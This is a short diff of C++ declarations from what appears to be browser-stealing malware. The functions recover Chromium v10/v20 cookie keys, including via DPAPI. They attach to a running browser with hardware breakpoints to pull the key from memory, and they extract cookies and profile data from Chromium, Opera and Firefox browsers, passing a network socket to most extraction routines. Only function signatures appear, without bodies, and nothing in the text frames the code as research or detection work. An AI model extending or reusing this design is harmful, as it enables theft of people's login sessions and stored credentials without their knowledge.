@@ -236,13 +236,12 @@ std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use
 std::vector<uint8_t> base64_decode(const std::string& input);
 bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi);
 void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir);
-void debug_loop(SOCKET sock, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
+std::vector<uint8_t> debug_loop_get_key(HANDLE h_process, const BrowserConfig& config);
 size_t find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name);
 std::vector<uint32_t> get_all_threads(uint32_t process_id);
 void set_hardware_breakpoint(uint32_t thread_id, size_t address);
 void clear_hardware_breakpoints(uint32_t process_id);
 void set_resume_flag(uint32_t thread_id);
-bool extract_key(SOCKET sock, uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
 void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::wstring& user_data_dir);
 void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera, const std::string& browser_name, const std::string& profile_name);
 void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::string& browser_name, const std::string& profile_name);
